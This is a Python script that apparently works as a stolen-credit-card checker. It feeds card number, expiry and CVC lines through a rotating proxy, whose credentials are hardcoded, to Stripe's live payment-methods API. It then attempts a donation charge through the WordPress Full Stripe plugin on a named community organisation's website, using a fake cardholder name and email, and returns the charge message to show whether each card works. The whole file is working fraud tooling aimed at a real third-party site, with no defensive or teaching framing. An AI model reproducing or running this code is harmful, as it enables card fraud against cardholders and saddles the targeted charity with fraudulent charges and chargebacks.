import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "p.webshare.io:80:rotate-zlanvdvs:7zzew86qyip3"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(2, 9)
	random_amount2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F399197339e%3B+stripe-js-v3%2F399197339e%3B+card-element&key=pk_live_51LqLrcKuYyCGsqVmBqB3jxUQeCs9GCzZG82Y0qXBJdE6WyvpXeKTBGpJ0xv0ObkWN98nTCwHInf77IpJv5Ka1ZEk00zcyPxtd9'
	
	response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'mauritaniancommunity-dmv-usa.org',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://mauritaniancommunity-dmv-usa.org',
	    'referer': 'https://mauritaniancommunity-dmv-usa.org/membership-donations/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'action': 'wp_full_stripe_inline_donation_charge',
	    'wpfs-form-name': 'Dmv',
	    'wpfs-form-get-parameters': '%7B%7D',
	    'wpfs-custom-amount': 'other',
	    'wpfs-custom-amount-unique': '1',
	    'wpfs-donation-frequency': 'one-time',
	    'wpfs-card-holder-email': f'genpaypal{random_amount2}@gmail.com',
	    'wpfs-card-holder-name': 'Gen Paypal',
	    'wpfs-stripe-payment-method-id': f'{pm}',
	}
	
	response = session.post(
	    'https://mauritaniancommunity-dmv-usa.org/wp-admin/admin-ajax.php',
	    headers=headers,
	    data=data,
	)
	
	try:
		result = re.search(r'"message":"(.*?)"', response.text).group(1)
	except:
		result = response.text
		
	return (result)
